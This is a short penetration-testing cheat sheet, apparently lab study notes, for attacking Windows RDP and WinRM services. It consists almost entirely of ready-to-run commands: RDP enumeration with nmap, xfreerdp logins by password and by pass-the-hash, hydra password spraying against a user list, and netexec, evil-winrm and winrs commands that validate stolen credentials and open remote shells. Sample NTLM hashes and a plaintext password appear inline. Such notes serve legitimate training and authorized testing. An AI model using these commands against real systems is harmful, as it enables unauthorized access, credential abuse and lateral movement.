## RDP — 3389

```bash
# Enumerate RDP encryption and NTLM details.
nmap -Pn -p3389 --script rdp-enum-encryption,rdp-ntlm-info "$IP" -oN rdp.txt
# Connect to RDP with a password.
xfreerdp /v:"$IP" /u:"$RUSER" /p:"$PASS" /cert:ignore +clipboard /dynamic-resolution
# Connect to RDP with an NTLM hash.
xfreerdp /v:"$IP" /u:julio /pth:'64F12CDDAA88057E06A81B54E73B949B' /cert:ignore
# Test a username list against one RDP password.
hydra -L users.txt -p 'Nexus123!' "rdp://$IP" -o rdp-hydra.txt
```

## WinRM — 5985, 5986

```bash
# Validate WinRM credentials.
netexec winrm "$IP" -d "$DOMAIN" -u "$RUSER" -p "$PASS"
# Open a WinRM shell with a password.
evil-winrm -i "$IP" -u "$RUSER" -p "$PASS"
# Open a WinRM shell with an NTLM hash.
evil-winrm -i "$IP" -u Administrator -H '7a38310ea6f0027ee955abed1762964b'
```

```cmd
REM Execute hostname and whoami through WinRM.
winrs -r:files04 -u:corp\pete -p:Nexus123! "cmd /c hostname & whoami"
```
